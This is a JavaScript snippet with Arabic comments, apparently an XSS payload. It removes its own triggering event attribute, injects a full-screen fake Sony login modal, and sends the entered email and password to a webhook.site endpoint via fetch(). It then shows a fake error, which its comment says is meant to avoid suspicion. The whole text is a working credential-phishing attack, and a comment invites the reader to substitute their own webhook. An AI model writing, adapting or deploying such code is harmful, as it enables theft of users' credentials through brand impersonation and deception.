// 1. ابحث عن العنصر الذي يحمل الثغرة وقم بتعطيل الحدث منه فوراً لمنع التكرار
var payloadElement = document.querySelector('[oncontentvisibilityautostatechange]');
if (payloadElement) {
    payloadElement.removeAttribute('oncontentvisibilityautostatechange');
}

// 2. تأكد أن الفورم غير موجود مسبقاً قبل حقنه
if (!document.getElementById('sony-fake-login-modal')) {
    var modal = document.createElement('div');
    modal.id = 'sony-fake-login-modal';
    modal.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(5px);";
    
    modal.innerHTML = `
    <div style="background:#fff;padding:40px;border-radius:8px;width:380px;text-align:center;font-family:'Segoe UI',Roboto,Arial,sans-serif;box-shadow:0 10px 30px rgba(0,0,0,0.5);">
        <img src="https://sony.net" width="120" style="margin-bottom:25px;">
        <h2 style="color:#000;margin:0 0 10px;font-size:22px;font-weight:600;">Sign In</h2>
        <p style="font-size:14px;color:#555;margin-bottom:25px;">Please sign in with your Sony account to continue.</p>
        
        <input type="email" id="sony-user" placeholder="Email address" style="width:100%;margin-bottom:15px;padding:12px;border:1px solid #888;border-radius:4px;font-size:16px;box-sizing:border-box;">
        <input type="password" id="sony-pass" placeholder="Password" style="width:100%;margin-bottom:20px;padding:12px;border:1px solid #888;border-radius:4px;font-size:16px;box-sizing:border-box;">
        
        <button id="sony-submit" style="width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:25px;cursor:pointer;font-size:16px;font-weight:bold;transition:0.3s;">Sign In</button>
        
        <div style="margin-top:20px;font-size:13px;color:#0071e3;cursor:pointer;">Forgot password?</div>
    </div>`;

    document.body.appendChild(modal);

    // 3. برمجة زر الإرسال
    document.getElementById('sony-submit').onclick = function() {
        var u = document.getElementById('sony-user').value;
        var p = document.getElementById('sony-pass').value;
        
        if(u && p) {
            // إرسال البيانات لسيرفرك (استبدل الرابط برابط Webhook الخاص بك)
            fetch('https://webhook.site/1f5c01fc-72f2-4a77-9b53-b93d57154665' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
            
            // إظهار رسالة خطأ وهمية لإبعاد الشبهة
            alert("Error: The service is currently unavailable. Please try again later.");
            modal.remove(); // إغلاق النافذة بعد الإرسال
        } else {
            alert("Please enter your credentials.");
        }
    };
}
